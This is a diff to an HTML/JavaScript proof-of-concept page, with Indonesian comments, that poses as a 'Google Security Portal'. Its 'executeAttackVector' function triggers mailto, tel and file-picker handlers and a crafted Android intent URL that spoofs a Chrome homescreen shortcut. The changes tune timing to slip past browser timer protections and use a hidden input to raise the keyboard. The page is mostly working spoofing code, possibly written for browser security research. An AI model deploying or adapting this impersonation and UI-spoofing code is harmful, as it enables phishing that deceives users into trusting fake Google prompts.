@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker & Protocol Spoof PoC</title>
+    <title>File Picker & Protocol Spoof PoC - Synchronized</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,6 +48,7 @@
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
+            cursor: pointer;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -74,7 +75,7 @@
             font-size: 11px;
             color: #9aa0a6;
         }
-        /* Hidden input untuk memicu keyboard virtual Android */
+        /* Hidden input untuk memicu keyboard virtual Android secara sinkron */
         #hiddenInput {
             position: absolute;
             opacity: 0;
@@ -91,14 +92,14 @@
     <input type="text" id="hiddenInput" autocomplete="off">
 
     <div class="banner">Google Security Portal</div>
-    <h1> PUQI <h1>
+    <h1>PUQI</h1>
 
-    <!-- Container dengan 4 Tombol Terpisah (Termasuk Android Intent) -->
+    <!-- Container dengan 4 Tombol Terpisah -->
     <div class="button-container">
-        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
-        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
-        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
-        <a href="https://chrome.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
+        <a class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
+        <a class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
     <!-- Uploaded Image Preview Box -->
@@ -110,7 +111,7 @@
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        // Memicu fokus ke input tersembunyi saat interaksi pertama untuk menaikkan keyboard
+        // Fungsi untuk menaikkan virtual keyboard secara instan
         const triggerKeyboard = () => {
             const hiddenInput = document.getElementById("hiddenInput");
             if (hiddenInput) {
@@ -118,108 +119,102 @@
             }
         };
 
-        // Auto trigger saat halaman disentuh/diklik pertama kali
+        // Auto trigger interaksi pertama
         window.addEventListener('touchstart', triggerKeyboard, { once: true });
         window.addEventListener('click', triggerKeyboard, { once: true });
 
         let triggered = false;
 
-        const executeAttackVector = (actionType, intent) => {
+        const executeAttackVector = async (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
-            // Panggil fungsi keyboard agar naik bersamaan dengan aksi serangan
+            // 1. Eksekusi pemanggilan keyboard secara sinkron di awal interaksi
             triggerKeyboard();
 
-            // Timer optimized to match the preview page opening animation
-            setTimeout(async () => {
-                try {
-                    const previewBox = document.getElementById("previewBox");
-                    const imagePreview = document.getElementById("imagePreview");
-                    const fileInfo = document.getElementById("fileInfo");
+            try {
+                const previewBox = document.getElementById("previewBox");
+                const imagePreview = document.getElementById("imagePreview");
+                const fileInfo = document.getElementById("fileInfo");
 
-                    if (actionType === 'mailto') {
-                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
-                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
-                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
-                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
-                        imagePreview.src = "";
+                if (actionType === 'mailto') {
+                    const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                    const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                    window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                    fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                    imagePreview.src = "";
+                    previewBox.style.display = "block";
+                } 
+                else if (actionType === 'tel') {
+                    window.location.href = "tel:+18005550199";
+                    fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                    imagePreview.src = "";
+                    previewBox.style.display = "block";
+                } 
+                else if (actionType === 'filepicker') {
+                    const [fileHandle] = await window.showOpenFilePicker({
+                        multiple: false,
+                        types: [{
+                            description: 'Images & Documents',
+                            accept: { 
+                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                'application/pdf': ['.pdf']
+                            }
+                        }]
+                    });
+
+                    const file = await fileHandle.getFile();
+                    fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
+
+                    if (file.type.startsWith('image/')) {
+                        imagePreview.src = URL.createObjectURL(file);
                         previewBox.style.display = "block";
-                    } 
-                    else if (actionType === 'tel') {
-                        window.location.href = "tel:+18005550199";
-                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    } 
-                    else if (actionType === 'filepicker') {
-                        // Menggunakan File System Access API
-                        const [fileHandle] = await window.showOpenFilePicker({
-                            multiple: false,
-                            types: [{
-                                description: 'Images & Documents',
-                                accept: { 
-                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-                                    'application/pdf': ['.pdf']
-                                }
-                            }]
-                        });
-
-                        const file = await fileHandle.getFile();
-                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
-
-                        if (file.type.startsWith('image/')) {
-                            imagePreview.src = URL.createObjectURL(file);
-                            previewBox.style.display = "block";
-                        } else {
-                            imagePreview.src = "";
-                            previewBox.style.display = "block";
-                        }
-                    }
-                    else if (actionType === 'intentspoof') {
-                        // Menggunakan parameter intent spesifik NDevTK
-                        const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                        window.location.href = intentUrl;
-                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
+                    } else {
                         imagePreview.src = "";
                         previewBox.style.display = "block";
                     }
-
-                } catch (err) {
-                    console.debug("Handler cancelled or blocked:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1100);
                 }
-            }, 2000 // 1.9 seconds delay for ephemeral tab
+                else if (actionType === 'intentspoof') {
+                    // Sinkronisasi timing eksekusi intent agar mulus tanpa terblokir proteksi timer panjang
+                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                    
+                    // Jeda mikro 50ms untuk memastikan sinkronisasi DOM render & keyboard aktif
+                    setTimeout(() => {
+                        window.location.href = intentUrl;
+                    }, 50);
+
+                    fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
+                    imagePreview.src = "";
+                    previewBox.style.display = "block";
+                }
+
+            } catch (err) {
+                console.debug("Handler cancelled or blocked:", err.message);
+            } finally {
+                setTimeout(() => { triggered = false; }, 1000);
+            }
         };
 
-        // Event listener untuk Tombol Mailto
-        const linkMailto = document.getElementById("targetLinkMailto");
-        linkMailto.addEventListener("contextmenu", (e) => {
-            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
+        // Event listeners diselaraskan menggunakan 'click' agar langsung menangkap user activation secara akurat
+        document.getElementById("targetLinkMailto").addEventListener("click", (e) => {
+            e.preventDefault();
+            executeAttackVector('mailto', e.target.getAttribute('data-intent'));
         });
-        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
 
-        // Event listener untuk Tombol Tel
-        const linkTel = document.getElementById("targetLinkTel");
-        linkTel.addEventListener("contextmenu", (e) => {
-            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        document.getElementById("targetLinkTel").addEventListener("click", (e) => {
+            e.preventDefault();
+            executeAttackVector('tel', e.target.getAttribute('data-intent'));
         });
-        linkTel.addEventListener("touchstart", () => {}, { passive: true });
 
-        // Event listener untuk Tombol File Picker
-        const linkFile = document.getElementById("targetLinkFile");
-        linkFile.addEventListener("contextmenu", (e) => {
-            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        document.getElementById("targetLinkFile").addEventListener("click", (e) => {
+            e.preventDefault();
+            executeAttackVector('filepicker', e.target.getAttribute('data-intent'));
         });
-        linkFile.addEventListener("touchstart", () => {}, { passive: true });
 
-        // Event listener untuk Tombol Android Intent Spoof
-        const linkIntent = document.getElementById("targetLinkIntent");
-        linkIntent.addEventListener("contextmenu", (e) => {
-            executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent'));
+        document.getElementById("targetLinkIntent").addEventListener("click", (e) => {
+            e.preventDefault();
+            executeAttackVector('intentspoof', e.target.getAttribute('data-intent'));
         });
-        linkIntent.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
